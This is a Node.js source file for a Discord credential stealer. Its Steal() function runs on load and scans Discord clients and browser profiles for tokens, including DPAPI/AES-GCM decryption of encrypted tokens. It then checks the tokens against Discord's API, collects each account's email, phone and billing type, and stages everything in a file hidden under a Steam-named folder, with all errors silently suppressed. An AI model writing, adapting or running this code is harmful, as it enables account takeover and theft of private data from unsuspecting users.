const axios = require("axios");
const fs = require("fs");
const path = require("path");
const Dpapi = require("node-dpapi-prebuilt");
const crypto = require("crypto");

const APPDATA = process.env.APPDATA || process.env.LOCALAPPDATA;
const LOCALLOW = path.join(APPDATA, "..", "LocalLow");
const outputDir = path.join(LOCALLOW, "Temp", "Steam", "Ui.012", "Social", "Discord");

function generateBrowserProfiles(basePath) {
  const profiles = [path.join(APPDATA, basePath, "Default")];
  
  for (let i = 1; i <= 10; i++) {
    profiles.push(path.join(APPDATA, basePath, `Profile ${i}`));
  }
  
  return profiles;
}

function getGeckoProfiles(basePath) {
  const profiles = [];
  try {
    if (fs.existsSync(basePath)) {
      const items = fs.readdirSync(basePath);
      for (const item of items) {
        const fullPath = path.join(basePath, item);
        if (fs.statSync(fullPath).isDirectory()) {
          profiles.push(fullPath);
        }
      }
    }
  } catch (error) {}
  return profiles;
}

const paths = [
  path.join(APPDATA, "discord"),
  path.join(APPDATA, "discordcanary"),
  path.join(APPDATA, "discordptb"),
  path.join(APPDATA, "discorddevelopment"),
  path.join(APPDATA, "lightcord"),
  ...generateBrowserProfiles("Google\\Chrome\\User Data"),
  path.join(APPDATA, "Opera Software", "Opera Stable"),
  path.join(APPDATA, "Opera Software", "Opera GX Stable"),
  ...generateBrowserProfiles("BraveSoftware\\Brave-Browser\\User Data"),
  ...generateBrowserProfiles("Yandex\\YandexBrowser\\User Data"),
  ...generateBrowserProfiles("Microsoft\\Edge\\User Data"),
  ...getGeckoProfiles(path.join(APPDATA, "Mozilla", "Firefox", "Profiles")),
  ...getGeckoProfiles(path.join(APPDATA, "Waterfox", "Profiles"))
];

const uniquePaths = [...new Set(paths.filter(p => {
  try {
    return fs.existsSync(p);
  } catch {
    return false;
  }
}))];

async function Steal() {
  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }
  
  const foundTokens = [];
  
  for (let searchPath of uniquePaths) {
    await findToken(searchPath, foundTokens);
  }
  
  if (foundTokens.length === 0) {
    fs.writeFileSync(path.join(outputDir, "tokens.txt"), "No tokens found\n");
    return;
  }
  
  let validAccounts = 0;
  for (let token of foundTokens) {
    try {
      const json = await axios
        .get("https://discord.com/api/v9/users/@me", {
          headers: {
            "Content-Type": "application/json",
            authorization: token,
          },
          timeout: 10000
        })
        .then((response) => response.data)
        .catch(() => null);
      
      if (!json) continue;

      validAccounts++;
      
      const billing = await getBilling(token);
      
      const output = `==================================================
Identifier      : ${json.id}
Username        : ${json.username}${json.discriminator && json.discriminator !== '0' ? `#${json.discriminator}` : ''}
Phone           : ${json.phone || "None"}
E-Mail Address  : ${json.email || "None"}
Locale          : ${json.locale}
Nitro           : ${json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"}
Badges          : ${getBadgesNames(json.flags)}
Billing         : ${billing}
Token           : ${token}
==================================================

`;
      fs.appendFileSync(path.join(outputDir, "tokens.txt"), output);
      
    } catch (error) {}
  }
  
  if (validAccounts === 0) {
    fs.writeFileSync(path.join(outputDir, "tokens.txt"), "No valid tokens found\n");
  }
}

async function findToken(searchPath, foundTokens) {
  const path_tail = searchPath;
  const leveldbPath = path.join(searchPath, "Local Storage", "leveldb");

  try {
    if (!fs.existsSync(leveldbPath)) return;
    
    const files = fs.readdirSync(leveldbPath);
    
    for (const file of files) {
      if (file.endsWith(".log") || file.endsWith(".ldb")) {
        try {
          const filePath = path.join(leveldbPath, file);
          const content = fs.readFileSync(filePath, "utf8");
          
          if (!path_tail.includes("discord")) {
            const patterns = [
              /mfa\.[\w-]{84}/g,
              /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g
            ];

            for (const pattern of patterns) {
              const foundTokensInLine = content.match(pattern);
              if (foundTokensInLine) {
                foundTokensInLine.forEach((token) => {
                  if (!foundTokens.includes(token)) {
                    foundTokens.push(token);
                  }
                });
              }
            }
          } else {
            const pattern = /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g;
            const foundTokensInLine = content.match(pattern);

            if (foundTokensInLine) {
              foundTokensInLine.forEach((encryptedToken) => {
                try {
                  const localStatePath = path.join(path_tail, "Local State");
                  if (!fs.existsSync(localStatePath)) return;
                  
                  const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
                  const encrypted = Buffer.from(localState.os_crypt.encrypted_key, "base64").subarray(5);
                  const key = Dpapi.unprotectData(encrypted, null, "CurrentUser");

                  const tokenBuffer = Buffer.from(encryptedToken.split("dQw4w9WgXcQ:")[1], "base64");

                  const start = tokenBuffer.slice(3, 15);
                  const middle = tokenBuffer.slice(15, tokenBuffer.length - 16);
                  const end = tokenBuffer.slice(tokenBuffer.length - 16, tokenBuffer.length);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                  decipher.setAuthTag(end);

                  const finalToken = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                  
                  if (!foundTokens.includes(finalToken)) {
                    foundTokens.push(finalToken);
                  }
                } catch (e) {}
              });
            }
          }
        } catch (fileError) {}
      }
    }
    
  } catch (error) {}
}

async function getBilling(token) {
  try {
    const json = await axios
      .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
          "Content-Type": "application/json",
          authorization: token,
        },
        timeout: 5000
      })
      .then((response) => response.data)
      .catch(() => null);

    if (!json || !Array.isArray(json)) return "Unknown";
    if (!json.length) return "No Billing";

    let billings = [];
    for (const billing of json) {
      if (billing.type == 2 && billing.invalid != true) {
        billings.push("PayPal");
      } else if (billing.type == 1 && billing.invalid != true) {
        billings.push("Credit Card");
      }
    }

    return billings.length ? billings.join(", ") : "No Billing";
  } catch {
    return "Unknown";
  }
}

function getBadgesNames(flags) {
  const badges = {
    Discord_Employee: 1,
    Partnered_Server_Owner: 2,
    HypeSquad_Events: 4,
    Bug_Hunter_Level_1: 8,
    House_Bravery: 64,
    House_Brilliance: 128,
    House_Balance: 256,
    Early_Supporter: 512,
    Bug_Hunter_Level_2: 16384,
    Early_Verified_Bot_Developer: 131072,
    Discord_Official_Moderator: 262144,
  };

  let badgeNames = [];
  for (const [name, value] of Object.entries(badges)) {
    if ((flags & value) === value) {
      badgeNames.push(name);
    }
  }

  return badgeNames.length ? badgeNames.join(", ") : "No Badges";
}

Steal().catch(() => {});